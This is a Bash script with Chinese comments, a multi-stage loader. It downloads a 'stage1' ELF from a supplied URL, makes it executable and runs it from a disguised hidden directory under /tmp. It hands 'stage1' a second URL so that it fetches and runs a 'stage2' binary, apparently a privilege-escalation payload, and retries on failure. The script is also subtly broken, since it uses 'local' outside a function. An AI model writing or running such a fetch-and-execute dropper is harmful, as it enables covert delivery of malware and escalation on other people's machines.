#!/usr/bin/env bash
# controller.sh
# 用途：下载并执行 stage1，stage1 内部负责下载并执行 stage2
#       stage1 失败时自动重试
# 使用方法：
#   ./controller.sh <stage1_url> <stage2_url>
# 示例：
#   ./controller.sh https://.../test_controller.elf https://.../test_escalation.elf

set -euo pipefail

# ==================== 配置 ====================
MAX_RETRIES=5               # stage1 最大重试次数
RETRY_DELAY=8               # 重试间隔（秒）
TMPDIR_BASE="/tmp/.sysd-tmp"

# ==================== 日志函数 ====================
log() {
    local level="$1"
    shift
    printf "[%s] [%s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$*" >&2
}

log_info()  { log "INFO"  "$@"; }
log_warn()  { log "WARN"  "$@"; }
log_error() { log "ERROR" "$@"; }
log_success() { log " OK " "$@"; }

# ==================== 参数检查 ====================
if [ $# -ne 2 ]; then
    log_error "用法: $0 <stage1_url> <stage2_url>"
    log_error "示例: $0 https://example.com/stage1.elf https://example.com/stage2.elf"
    exit 1
fi

URL_STAGE1="$1"
URL_STAGE2="$2"

# ==================== 准备临时目录 ====================
TMPDIR="${TMPDIR_BASE}-$(head -c8 /dev/urandom | xxd -p -c8)"
mkdir -p "$TMPDIR" 2>/dev/null || {
    log_error "无法创建临时目录: $TMPDIR"
    exit 1
}
cd "$TMPDIR" || {
    log_error "无法进入临时目录: $TMPDIR"
    exit 1
}

log_info "工作目录: $TMPDIR"
log_info "Stage1 URL: $URL_STAGE1"
log_info "Stage2 URL: $URL_STAGE2"

# ==================== 下载函数 ====================
download_file() {
    local url="$1"
    local output="$2"
    local desc="$3"

    log_info "正在下载 ${desc}... (${url})"
    if ! wget -q --no-cache --tries=3 --timeout=15 "$url" -O "$output"; then
        log_error "下载 ${desc} 失败: ${url}"
        return 1
    fi
    log_success "${desc} 下载完成: ${output} ($(du -h "$output" | cut -f1))"
    chmod +x "$output" 2>/dev/null || true
    return 0
}

# ==================== 主流程 ====================
attempt=1
while [ $attempt -le $MAX_RETRIES ]; do
    log_info "================= 第 ${attempt}/${MAX_RETRIES} 次尝试执行 Stage1 ================="

    local stage1_bin="stage1_$(head -c6 /dev/urandom | xxd -p -c6).elf"
    local stage2_bin="stage2.elf"  # stage1 内部会知道这个名字

    # 1. 下载 Stage1
    if ! download_file "$URL_STAGE1" "$stage1_bin" "Stage1"; then
        log_error "Stage1 下载失败，本次尝试失败"
        attempt=$((attempt + 1))
        sleep $RETRY_DELAY
        continue
    fi

    # 2. 通过环境变量把 Stage2 URL 传给 Stage1
    log_info "启动 Stage1... (将 Stage2 URL 通过环境变量传递)"
    log_info "执行命令: STAGE2_URL=\"$URL_STAGE2\" ./$stage1_bin"

    # 非常重要：把 STAGE2_URL 通过环境变量传递给 stage1
    if STAGE2_URL="$URL_STAGE2" STAGE2_FILENAME="$stage2_bin" \
        ./$stage1_bin; then
        exit_code=$?
        log_success "Stage1 执行成功 (退出码: $exit_code)"
        log_success "根据设计，Stage1 内部应已负责下载并执行 Stage2"
        log_success "控制器退出（正常）"
        # 可选择是否清理：rm -rf "$TMPDIR" （生产环境慎用）
        exit 0
    else
        exit_code=$?
        log_error "Stage1 执行失败 (退出码: $exit_code)"
        log_warn "将在 ${RETRY_DELAY} 秒后进行第 $((attempt + 1)) 次重试..."
        attempt=$((attempt + 1))
        sleep $RETRY_DELAY
    fi
done

# 到达这里说明重试次数用尽
log_error "错误：Stage1 在 $MAX_RETRIES 次尝试后仍然失败！"
log_error "请检查网络、URL有效性或 Stage1 本身逻辑。"
exit 1